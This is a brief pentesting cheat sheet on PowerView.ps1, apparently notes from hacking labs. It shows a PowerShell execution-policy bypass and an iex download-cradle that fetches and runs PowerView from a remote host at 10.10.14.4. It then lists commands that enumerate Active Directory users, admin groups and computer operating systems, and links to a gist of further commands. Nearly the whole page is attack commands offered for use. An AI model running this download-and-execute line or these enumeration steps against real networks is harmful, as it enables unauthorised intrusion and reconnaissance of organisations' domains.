# PowerView.ps1

### Bypass powershell

`powershell -ep bypass` `-ep` bypasses the execution policy of powershell allowing you to easily run scripts

### Starting Powerview

```
iex(new-object net.webclient).downloadstring('http://10.10.14.4:9090/PowerView.ps1')
```

`. .\Downloads\PowerView.ps1`

### Useful Commands

* Enumerate domain users : `Get-NetUser | select cn`
* Enumerate domain groups : `Get-NetGroup -GroupName *admin*`
* Enumerate domain OS : `Get-NetComputer -fulldata | select operatingsystem`

**LIST**&#x20;

{% embed url="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" %}

